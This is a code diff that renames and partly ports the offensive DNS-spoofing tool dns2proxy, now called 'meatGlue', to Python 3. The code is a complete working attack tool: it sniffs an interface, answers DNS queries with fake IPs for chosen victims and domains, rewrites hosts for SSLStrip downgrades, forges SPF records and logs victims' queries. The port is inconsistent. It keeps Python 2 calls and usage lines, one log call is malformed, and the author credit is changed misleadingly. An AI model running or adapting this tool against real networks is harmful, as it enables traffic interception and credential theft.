@@ -1,20 +1,20 @@
-#!/usr/bin/python2.6
+#!/usr/bin/python3.6
 '''
-dns2proxy for offensive cybersecurity v1.0
+meatGlue for offensive cybersecurity v1.0
 
 
-python dns2proxy.py -h for Usage.
+python meatGlue.py -h for Usage.
 
 Example:
-python2.6 dns2proxy.py -i eth0 -u 192.168.1.101 -d 192.168.1.200
+python2.6 meatGlue.py -i eth0 -u 192.168.1.101 -d 192.168.1.200
 
 Example for no forwarding (only configured domain based queries and spoofed hosts):
-  python2.6 dns2proxy.py -i eth0 -noforward
+  python2.6 meatGlue.py -i eth0 -noforward
 
 Example for no forwarding but add IPs
-  python dns2proxy.py -i eth0 -I 192.168.1.101,90.1.1.1,155.54.1.1 -noforward
+  python meatGlue.py -i eth0 -I 192.168.1.101,90.1.1.1,155.54.1.1 -noforward
 
-Author: Leonardo Nve ( leonardo.nve@gmail.com)
+Based on meatGlue by Leonardo Nve ( leonardo.nve@gmail.com)
 '''
 
 
@@ -43,16 +43,16 @@ nospoof = []
 nospoofto = []
 victims = []
 
-LOGREQFILE = "./logs/AccessPoint/dns2proxy.log"
-LOGSNIFFFILE = "plugins/external/dns2proxy/snifflog.txt"
-LOGALERTFILE = "plugins/external/dns2proxy/dnsalert.txt"
-RESOLVCONF = "plugins/external/dns2proxy/resolv.conf"
-victim_file = "plugins/external/dns2proxy/victims.cfg"
-nospoof_file = "plugins/external/dns2proxy/nospoof.cfg"
-nospoofto_file = "plugins/external/dns2proxy/nospoofto.cfg"
-specific_file = "plugins/external/dns2proxy/spoof.cfg"
-dominios_file = "plugins/external/dns2proxy/domains.cfg"
-transform_file = "plugins/external/dns2proxy/transform.cfg"
+LOGREQFILE = "./logs/AccessPoint/meatGlue.log"
+LOGSNIFFFILE = "plugins/meatGlue/snifflog.txt"
+LOGALERTFILE = "plugins/meatGlue/dnsalert.txt"
+RESOLVCONF = "plugins/meatGlue/resolv.conf"
+victim_file = "plugins/meatGlue/victims.cfg"
+nospoof_file = "plugins/meatGlue/nospoof.cfg"
+nospoofto_file = "plugins/meatGlue/nospoofto.cfg"
+specific_file = "plugins/meatGlue/spoof.cfg"
+dominios_file = "plugins/meatGlue/domains.cfg"
+transform_file = "plugins/meatGlue/transform.cfg"
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-N", "--noforward", help="DNS Fowarding OFF (default ON)", action="store_true")
@@ -97,7 +97,7 @@ def SIGUSR1_handle(signalnum, frame):
     global noserv
     global Resolver
     noserv = 0
-    logdns2proxy.info('Reconfiguring....')
+    logmeatGlue.info('Reconfiguring....')
     process_files()
     Resolver.reset()
     Resolver.read_resolv_conf(RESOLVCONF)
@@ -131,7 +131,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 0:
-            logdns2proxy.info('Non spoofing ' + h[0])
+            logmeatGlue.info('Non spoofing ' + h[0])
             nospoof.append(h[0])
 
     nsfile.close()
@@ -142,7 +142,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 0:
-            logdns2proxy.info('Spoofing only to ' + h[0])
+            logmeatGlue.info('Spoofing only to ' + h[0])
             victims.append(h[0])
 
     nsfile.close()
@@ -153,7 +153,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 0:
-            logdns2proxy.info('Non spoofing to ' + h[0])
+            logmeatGlue.info('Non spoofing to ' + h[0])
             nospoofto.append(h[0])
 
     nsfile.close()
@@ -164,7 +164,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 1:
-            logdns2proxy.info('Specific host spoofing ' + h[0] + ' with ' + h[1])
+            logmeatGlue.info('Specific host spoofing ' + h[0] + ' with ' + h[1])
             spoof[h[0]] = h[1]
 
     nsfile.close()
@@ -174,7 +174,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 1:
-            logdns2proxy.info('Specific domain IP ' + h[0] + ' with ' + h[1])
+            logmeatGlue.info('Specific domain IP ' + h[0] + ' with ' + h[1])
             dominios[h[0]] = h[1]
 
     nsfile.close()
@@ -207,7 +207,7 @@ class ThreadSniffer(threading.Thread):
         threading.Thread.__init__(self)
 
     def run(self):
-        logdns2proxy.info( self.getName(), " Sniffer Waiting connections....")
+        #logmeatGlue.info(str(self.getName()), " Sniffer Waiting connections....")
         go()
 
 def go():
@@ -217,7 +217,7 @@ def go():
         ip1, ip1, adminip)
     cap = pcapy.open_live(dev, 255, 1, 0)
     cap.setfilter(bpffilter)
-    logdns2proxy.info( "Starting sniffing in (%s = %s)...." % (dev, ip1))
+    logmeatGlue.info( "Starting sniffing in (%s = %s)...." % (dev, ip1))
 
     #start sniffing packets
     while True:
@@ -226,7 +226,7 @@ def go():
             parse_packet(packet)
         except:
             pass
-            #logdns2proxy.info( ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen())))
+            #logmeatGlue.info( ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen())))
 
 #function to parse a packet
 def parse_packet(packet):
@@ -276,8 +276,8 @@ def parse_packet(packet):
 
 
             if consultas.has_key(str(s_addr)):
-                logdns2proxy.info(' ==> Source Address : ' + str(s_addr) + ' *  Destination Address : ' + str(d_addr))
-                logdns2proxy.info(' Source Port : ' + str(source_port) + ' *  Dest Port : ' + str(dest_port))
+                logmeatGlue.info(' ==> Source Address : ' + str(s_addr) + ' *  Destination Address : ' + str(d_addr))
+                logmeatGlue.info(' Source Port : ' + str(source_port) + ' *  Dest Port : ' + str(dest_port))
                 #            	print '>>>>  '+str(s_addr)+' esta en la lista!!!!.....'
                 comando = 'sh ./IPBouncer.sh %s %s %s %s' % (
                     ip2, str(dest_port), consultas[str(s_addr)], str(dest_port))
@@ -302,7 +302,7 @@ def parse_packet(packet):
             #dest_port = udph[1]
             #length = udph[2]
             #checksum = udph[3]
-            #logdns2proxy.info('Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(length) + ' Checksum : ' + str(checksum))
+            #logmeatGlue.info('Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(length) + ' Checksum : ' + str(checksum))
             #h_size = eth_length + iph_length + udph_length
             #data_size = len(packet) - h_size
             #get data from the packet
@@ -316,11 +316,11 @@ def parse_packet(packet):
 def respuestas(name, type):
     global Resolver
 
-    logdns2proxy.info('Query = ' + name + ' ' + type)
+    logmeatGlue.info('Query = ' + name + ' ' + type)
     try:
         answers = Resolver.query(name, type)
     except Exception as e:
-        logdns2proxy.info('Exception...')
+        logmeatGlue.info('Exception...')
         return 0
     return answers
 
@@ -329,13 +329,15 @@ def requestHandler(address, message):
     resp = None
     dosleep = False
     try:
-        message_id = ord(message[0]) * 256 + ord(message[1])
-        logdns2proxy.info('msg id = ' + str(message_id))
+        msg2 = dns.message.from_wire(message).id 
+        #message = message.decode('latin-1')
+        message_id = msg2
+        logmeatGlue.info('msg id = ' + str(message_id))
         if message_id in serving_ids:
-            logdns2proxy.info('I am already serving this request.')
+            logmeatGlue.info('I am already serving this request.')
             return
         serving_ids.append(message_id)
-        logdns2proxy.info('Client IP: ' + address[0])
+        logmeatGlue.info('Client IP: ' + address[0])
         prov_ip = address[0]
         try:
             msg = dns.message.from_wire(message)
@@ -346,22 +348,22 @@ def requestHandler(address, message):
                     qs = msg.question
                     if len(qs) > 0:
                         q = qs[0]
-                        logdns2proxy.info('request is ' + str(q))
+                        logmeatGlue.info('request is ' + str(q))
                         save_req(LOGREQFILE, 'Client IP: ' + address[0] + '    request is    ' + str(q) + '\n')
                         if q.rdtype == dns.rdatatype.A:
-                            logdns2proxy.info('Doing the A query....')
+                            logmeatGlue.info('Doing the A query....')
                             resp, dosleep = std_A_qry(msg, prov_ip)
                         elif q.rdtype == dns.rdatatype.PTR:
-                            #logdns2proxy.info('Doing the PTR query....')
+                            logmeatGlue.info('Doing the PTR query....')
                             resp = std_PTR_qry(msg)
                         elif q.rdtype == dns.rdatatype.MX:
-                            logdns2proxy.info('Doing the MX query....')
+                            logmeatGlue.info('Doing the MX query....')
                             resp = std_MX_qry(msg)
                         elif q.rdtype == dns.rdatatype.TXT:
-                            #logdns2proxy.info('Doing the TXT query....')
+                            logmeatGlue.info('Doing the TXT query....')
                             resp = std_TXT_qry(msg)
                         elif q.rdtype == dns.rdatatype.AAAA:
-                            #logdns2proxy.info('Doing the AAAA query....')
+                            logmeatGlue.info('Doing the AAAA query....')
                             resp = std_AAAA_qry(msg)
                         else:
                             # not implemented
@@ -371,16 +373,16 @@ def requestHandler(address, message):
                     resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented
 
             except Exception as e:
-                logdns2proxy.info('got ' + repr(e))
+                logmeatGlue.info('got ' + repr(e))
                 resp = make_response(qry=msg, RCODE=2)  # RCODE =  2    Server Error
-                logdns2proxy.info('resp = ' + repr(resp.to_wire()))
+                logmeatGlue.info('resp = ' + repr(resp.to_wire()))
         except Exception as e:
-            logdns2proxy.info('got ' + repr(e))
+            logmeatGlue.info('got ' + repr(e))
             resp = make_response(id=message_id, RCODE=1)  # RCODE =  1    Format Error
-            logdns2proxy.info('resp = ' + repr(resp.to_wire()))
+            logmeatGlue.info('resp = ' + repr(resp.to_wire()))
     except Exception as e:
         # message was crap, not even the ID
-        logdns2proxy.info('got ' + repr(e))
+        logmeatGlue.info('got ' + repr(e))
 
     if resp:
         s.sendto(resp.to_wire(), address)
@@ -389,18 +391,18 @@ def requestHandler(address, message):
 
 def std_PTR_qry(msg):
     qs = msg.question
-    logdns2proxy.info( str(len(qs)) + ' questions.')
+    logmeatGlue.info( str(len(qs)) + ' questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    logdns2proxy.info('Host: ' + iparpa)
+    logmeatGlue.info('Host: ' + iparpa)
     resp = make_response(qry=msg)
     hosts = respuestas(iparpa[:-1], 'PTR')
     if isinstance(hosts, numbers.Integral):
-        logdns2proxy.info('No host....')
+        logmeatGlue.info('No host....')
         resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
         return resp
 
     for host in hosts:
-        logdns2proxy.info('Adding ' + host.to_text())
+        logmeatGlue.info('Adding ' + host.to_text())
         rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.PTR, host.to_text())
         resp.answer.append(rrset)
 
@@ -409,21 +411,21 @@ def std_PTR_qry(msg):
 
 def std_MX_qry(msg):
     qs = msg.question
-    logdns2proxy.info(str(len(qs)) + ' questions.')
+    logmeatGlue.info(str(len(qs)) + ' questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    logdns2proxy.info('Host: ' + iparpa)
+    logmeatGlue.info('Host: ' + iparpa)
     resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
     return resp
     #Temporal disable MX responses
     resp = make_response(qry=msg)
     hosts = respuestas(iparpa[:-1], 'MX')
     if isinstance(hosts, numbers.Integral):
-        logdns2proxy.info('No host....')
+        logmeatGlue.info('No host....')
         resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
         return resp
 
     for host in hosts:
-        logdns2proxy.info('Adding ' + host.to_text())
+        logmeatGlue.info('Adding ' + host.to_text())
         rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.MX, host.to_text())
         resp.answer.append(rrset)
 
@@ -444,13 +446,13 @@ def std_TXT_qry(msg):
     spfresponse = ''
     if (dominio in dominios) or (host in dominios):
         ttl = 1
-        logdns2proxy.info('Alert domain! (TXT) ID: ' + host)
+        logmeatGlue.info('Alert domain! (TXT) ID: ' + host)
         # Here the HANDLE!
         #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
         save_req(LOGALERTFILE, 'Alert domain! (TXT) ID: ' + host+ '\n')
         if host in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%host
         if dominio in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%dominio
-        logdns2proxy.info('Responding with SPF = ' + spfresponse)
+        logmeatGlue.info('Responding with SPF = ' + spfresponse)
         rrset = dns.rrset.from_text(iparpa, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, spfresponse)
         resp.answer.append(rrset)
         return resp
@@ -482,13 +484,13 @@ def std_SPF_qry(msg):
     # host = "."+host
     # if (dominio in dominios) or (host in dominios):
     #     ttl = 1
-    #     logdns2proxy.info('Alert domain! (TXT) ID: ' + host)
+    #     logmeatGlue.info('Alert domain! (TXT) ID: ' + host)
     #     # Here the HANDLE!
     #     #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
     #     save_req(LOGALERTFILE, 'Alert domain! (TXT) ID: ' + host+ '\n')
     #     if host in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%host
     #     if dominio in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%dominio
-    #     logdns2proxy.info('Responding with SPF = ' + spfresponse)
+    #     logmeatGlue.info('Responding with SPF = ' + spfresponse)
     #     rrset = dns.rrset.from_text(iparpa, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, spfresponse)
     #     resp.answer.append(rrset)
     #     return resp
@@ -509,23 +511,23 @@ def std_SPF_qry(msg):
 
 def std_AAAA_qry(msg):
     if not Forward:
-        logdns2proxy.info('No host....')
+        logmeatGlue.info('No host....')
         resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
         return resp
     qs = msg.question
-    logdns2proxy.info(str(len(qs)) + ' questions.')
+    logmeatGlue.info(str(len(qs)) + ' questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    logdns2proxy.info('Host: ' + iparpa)
+    logmeatGlue.info('Host: ' + iparpa)
     resp = make_response(qry=msg)
     hosts = respuestas(iparpa[:-1], 'AAAA')
 
     if isinstance(hosts, numbers.Integral):
-        logdns2proxy.info('No host....')
+        logmeatGlue.info('No host....')
         resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
         return resp
 
     for host in hosts:
-        logdns2proxy.info('Adding ' + host.to_text())
+        logmeatGlue.info('Adding ' + host.to_text())
         rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.AAAA, host.to_text())
         resp.answer.append(rrset)
 
@@ -539,11 +541,11 @@ def std_A_qry(msg, prov_ip):
 
     dosleep = False
     qs = msg.question
-    logdns2proxy.info(str(len(qs)) + ' questions.')
+    logmeatGlue.info(str(len(qs)) + ' questions.')
     resp = make_response(qry=msg)
     for q in qs:
         qname = q.name.to_text()[:-1]
-        logdns2proxy.info('q name = ' + qname)
+        logmeatGlue.info('q name = ' + qname)
 
         host = qname.lower()
 
@@ -559,10 +561,6 @@ def std_A_qry(msg, prov_ip):
         if punto2 > -1:
             dominio = host[punto2:]
 
-
-        # punto = host.find(".")
-        # dominio = host[punto:]
-
         if (dominio in dominios) or (dom1 in dominios):
             ttl = 1
             id = host[:punto2]
@@ -571,12 +569,10 @@ def std_A_qry(msg, prov_ip):
                 dominio = dom1
 
             if not id=='www':
-                logdns2proxy.info('Alert domain! ID: ' + id)
-                # Here the HANDLE!
-                #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
+                logmeatGlue.info('Alert domain! ID: ' + id)
                 handler_msg(id)
                 save_req(LOGALERTFILE, 'Alert domain! ID: ' + id + '\n')
-            logdns2proxy.info('Responding with IP = ' + dominios[dominio])
+            logmeatGlue.info('Responding with IP = ' + dominios[dominio])
             rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
             resp.answer.append(rrset)
             return resp, dosleep
@@ -584,7 +580,7 @@ def std_A_qry(msg, prov_ip):
         if ".%s"%host in dominios:
             dominio = ".%s"%host
             ttl = 1
-            logdns2proxy.info('Responding with IP = ' + dominios[dominio])
+            logmeatGlue.info('Responding with IP = ' + dominios[dominio])
             rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
             resp.answer.append(rrset)
             return resp, dosleep
@@ -598,13 +594,13 @@ def std_A_qry(msg, prov_ip):
                     host2 = transformation[from_host]+host.split(from_host)[1]
                     break
             if host2 != '':
-                logdns2proxy.info('SSLStrip transforming host: %s => %s ...' % (host, host2))
+                logmeatGlue.info('SSLStrip transforming host: %s => %s ...' % (host, host2))
                 ips = respuestas(host2, 'A')
 
         #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
 
         if isinstance(ips, numbers.Integral):
-            logdns2proxy.info('No host....')
+            logmeatGlue.info('No host....')
             resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
             return resp, dosleep
 
@@ -616,43 +612,42 @@ def std_A_qry(msg, prov_ip):
             if host in spoof:
                 save_req(LOGREQFILE, '!!! Specific host (' + host + ') asked....\n')
                 for spoof_ip in spoof[host].split(","):
-                    logdns2proxy.info('Adding fake IP = ' + spoof_ip)
+                    logmeatGlue.info('Adding fake IP = ' + spoof_ip)
                     rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof_ip)
                     resp.answer.append(rrset)
                 return resp, dosleep
             elif Forward:
                 consultas[prov_ip] = prov_resp
-                #print 'DEBUG: Adding consultas[%s]=%s'%(prov_ip,prov_resp)
                 if ip1 is not None:
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip1)
-                    logdns2proxy.info('Adding fake IP = ' + ip1)
+                    logmeatGlue.info('Adding fake IP = ' + ip1)
                     resp.answer.append(rrset)
                 if ip2 is not None:
                     #Sleep only when using global resquest matrix
                     dosleep = True
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip2)
-                    logdns2proxy.info('Adding fake IP = ' + ip2)
+                    logmeatGlue.info('Adding fake IP = ' + ip2)
                     resp.answer.append(rrset)
                 if len(fake_ips)>0:
                     for fip in fake_ips:
                         rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
-                        logdns2proxy.info('Adding fake IP = ' + fip)
+                        logmeatGlue.info('Adding fake IP = ' + fip)
                         resp.answer.append(rrset)
 
         if not Forward and prov_ip not in nospoofto:
             if len(fake_ips) == 0:
-                logdns2proxy.info('No forwarding....')
+                logmeatGlue.info('No forwarding....')
                 resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
             elif len(fake_ips) > 0:
-                logdns2proxy.info('No forwarding (but adding fake IPs)...')
+                logmeatGlue.info('No forwarding (but adding fake IPs)...')
                 for fip in fake_ips:
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
-                    logdns2proxy.info('Adding fake IP = ' + fip)
+                    logmeatGlue.info('Adding fake IP = ' + fip)
                     resp.answer.append(rrset)
             return resp, dosleep
 
         for realip in ips:
-            logdns2proxy.info('Adding real IP  = ' + realip.to_text())
+            logmeatGlue.info('Adding real IP  = ' + realip.to_text())
             rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, realip.to_text())
             resp.answer.append(rrset)
 
@@ -661,7 +656,7 @@ def std_A_qry(msg, prov_ip):
 
 # def std_A2_qry(msg):
 # 	qs = msg.question
-# 	logdns2proxy.info(str(len(qs)) + ' questions.')
+# 	logmeatGlue.info(str(len(qs)) + ' questions.')
 # 	iparpa = qs[0].to_text().split(' ',1)[0]
 # 	print 'Host: '+ iparpa
 # 	resp = make_response(qry=msg)
@@ -672,14 +667,14 @@ def std_A_qry(msg, prov_ip):
 def std_ASPOOF_qry(msg):
     global spoof
     qs = msg.question
-    logdns2proxy.info(str(len(qs)) + ' questions.')
+    logmeatGlue.info(str(len(qs)) + ' questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    logdns2proxy.info('Host: ' + iparpa)
+    logmeatGlue.info('Host: ' + iparpa)
     resp = make_response(qry=msg)
 
     for q in qs:
         qname = q.name.to_text()[:-1]
-        logdns2proxy.info('q name = ' + qname) + ' to resolve ' + spoof[qname]
+        logmeatGlue.info('q name = ' + qname) + ' to resolve ' + spoof[qname]
         # 	    rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.facebook.com.')
         # 		resp.answer.append(rrset)
         # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.yahoo.com.')
@@ -723,9 +718,9 @@ def setup_logger(logger_name, log_file,key, level=logging.INFO):
     l.addHandler(fileHandler)
     l.addHandler(streamHandler)
 
-setup_logger('Dns2Proxy', './logs/AccessPoint/dns2proxy.log',key_session)
-logdns2proxy = logging.getLogger('Dns2Proxy')
-logdns2proxy.info('---[ Start Dns2proxy '+asctime()+']---')
+setup_logger('Dns2Proxy', './logs/AccessPoint/meatGlue.log',key_session)
+logmeatGlue = logging.getLogger('Dns2Proxy')
+logmeatGlue.info('---[ Start Dns2proxy '+asctime()+']---')
 process_files()
 Resolver.reset()
 Resolver.read_resolv_conf(RESOLVCONF)
@@ -733,11 +728,11 @@ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind(('', 53))
 if Forward:
-    logdns2proxy.info('DNS Forwarding activado....')
+    logmeatGlue.info('DNS forwarding actived')
 else:
-    logdns2proxy.info('DNS Forwarding desactivado....')
+    logmeatGlue.info('DNS forwarding deactivated')
 
-logdns2proxy.info('binded to UDP port 53.')
+logmeatGlue.info('Bound to UDP port 53')
 serving_ids = []
 noserv = True
 
@@ -747,7 +742,7 @@ if ip1 is not None and ip2 is not None and Forward:
 
 while True:
     if noserv:
-        logdns2proxy.info('waiting requests.')
+        logmeatGlue.info('Waiting requests')
 
     try:
         message, address = s.recvfrom(1024)
@@ -758,5 +753,5 @@ while True:
         break
 
     if noserv:
-        logdns2proxy.info('serving a request.')
+        logmeatGlue.info('Replying to request')
         requestHandler(address, message)
